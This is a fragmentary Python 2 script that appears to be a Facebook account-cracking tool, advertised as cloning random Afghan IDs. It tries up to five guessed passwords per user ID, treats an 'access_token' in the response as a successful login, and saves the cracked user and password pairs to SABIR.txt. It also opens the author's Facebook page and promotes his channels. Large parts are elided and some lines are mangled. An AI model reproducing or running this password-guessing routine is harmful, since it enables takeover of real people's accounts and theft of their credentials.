...
SABIR_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw"])

youtuber = SABIR_youtube

def youtube():

	Style_profaisor("  please Follow My Page author :) Thank you")	os.system("xdg-open https://www.facebook.com/Sidiqullah.455.1")
...
def telegram():
	...
	Style_profaisor("  please Follow My Facebook Acount :) Thank you")

	os.system("xdg-open https://www.facebook.com/Sidiqullah.455.1")
...
\033[1;91m    Author      :  S A B I R

\033[1;91m    GitHub      : https://github.com/SABIR455

\033[1;91m    Facebook : Sidiq Ullah Sabir 

\033[1;91m    Fb Page    : S A

\033[1;91m    Tools         : Random Afghan Ids clone
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY SABIRI KING ADIL'

        print '\x1b[1;92m THISE SCRIPT CREATED BY SABIRI KING ADIL '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print ' \x1b[1;92m[SABIRI_OK] ' + k + c + user + ' | ' + pass1

                okb = open('SABIR.txt', 'a')
                ...
                print ' \x1b[1;93m[SABIR_CP] ' + k + c + user + ' | ' + pass1

                cps = open('SABIR.txt', 'a')
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;92m[SABIR_OK] ' + k + c + user + ' | ' + pass2
                    ...
                    print ' \x1b[1;93m[SABIRI_CP] ' + k + c + user + ' | ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print ' \x1b[1;92m[SABIR_OK] ' + k + c + user + ' | ' + pass3
                        ...
                        print ' \x1b[1;93m[SABIR_CP] ' + k + c + user + ' | ' + pass3
                        ...
                        if 'access_token' in q:
                            ...
                            print ' \x1b[1;92m[SABIR_OK] ' + k + c + user + ' | ' + pass4
                            ...
                            print ' \x1b[1;93m[SABIR_CP] ' + k + c + user + ' | ' + pass4
                            ...
                            if 'access_token' in q:
                                ...
                                print ' \x1b[1;92m[SABIR_OK] ' + k + c + user + ' | ' + pass5
                                ...
                                print ' \x1b[1;93m[SABIR_CP] ' + k + c + user + ' | ' + pass5
    ...
    print ' Cloned Accounts Has Been Saved : SABIR.txt'
